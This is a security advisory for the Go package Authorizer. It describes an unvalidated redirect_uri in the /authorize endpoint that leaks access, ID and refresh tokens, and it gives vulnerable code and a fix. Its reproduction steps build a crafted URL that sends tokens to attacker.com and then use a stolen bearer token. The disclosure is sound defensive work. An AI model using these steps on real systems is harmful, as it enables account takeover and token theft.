# Authorizer: Unvalidated redirect_uri in /authorize leaks OAuth2 tokens to attacker-controlled URL

- CWE: CWE-601
- Packages: go:github.com/authorizerdev/authorizer

---

## Summary

The `/authorize` endpoint accepts any `redirect_uri` without validating it against `AllowedOrigins`. When `response_type=token` or `response_type=id_token`, the server appends `access_token`, `id_token`, and `refresh_token` as query parameters and issues a 302 redirect to the attacker-supplied URL. An unauthenticated attacker can obtain the required `client_id` from the public `/graphql?query={meta{client_id}}` endpoint.

Partial fix was applied in v2.0.1 to other handlers (`oauth_login`, `verify_email`, `magic_link_login`, `forgot_password`, `invite_members`, `oauth_callback`) but `/authorize` was not included.

## Vulnerable Code

`internal/http_handlers/authorize.go`:

```go
redirectURI := strings.TrimSpace(gc.Query("redirect_uri"))
// ... no IsValidOrigin() call ...
// response_type=token path (line ~263):
if strings.Contains(redirectURI, "?") {
    redirectURI = redirectURI + "&" + params
} else {
    redirectURI = redirectURI + "?" + params
}
handleResponse(gc, responseMode, authURL, redirectURI, ...) // 302 to attacker URL
```

Compare with the fixed `oauth_login.go` in v2.0.1 which calls `validators.IsValidOrigin(redirectURI, h.Config.AllowedOrigins)`.

## Steps to Reproduce

```bash
# 1. Obtain client_id (no authentication required)
CLIENT_ID=$(curl -s http://TARGET/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{meta{client_id}}"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['data']['meta']['client_id'])")

echo "client_id: $CLIENT_ID"

# 2. Craft the malicious URL and send to victim (victim must be logged in)
# When victim opens this URL, tokens are delivered to attacker.com
MALICIOUS_URL="http://TARGET/authorize?response_type=token&client_id=${CLIENT_ID}&redirect_uri=https://attacker.com/steal&scope=openid+profile+email&state=x&response_mode=query"

echo "Send to victim: $MALICIOUS_URL"

# 3. Attacker receives 302 redirect with all tokens:
# https://attacker.com/steal?access_token=eyJ...&token_type=bearer&expires_in=...&id_token=eyJ...

# 4. Validate stolen token
curl -s http://TARGET/userinfo \
  -H "Authorization: Bearer STOLEN_ACCESS_TOKEN"
# Returns: {"email":"victim@example.com","id":"...","roles":["user"]}
```

## Impact

An attacker who tricks a logged-in user into clicking a crafted link can steal the victim's `access_token`, `id_token`, and `refresh_token`. The attacker can then impersonate the victim for the full token lifetime. No user interaction beyond clicking the link is required; the victim's browser issues the redirect automatically.

## Proposed Fix

Add the same `IsValidOrigin` check that was applied to the other handlers in v2.0.1:

```go
// In authorize.go, after reading redirect_uri:
if !validators.IsValidOrigin(redirectURI, h.Config.AllowedOrigins) {
    handleResponse(gc, responseMode, authURL, redirectURI, map[string]interface{}{
        "error":             "invalid_request",
        "error_description": "redirect_uri is not allowed",
    }, http.StatusBadRequest)
    return
}
```
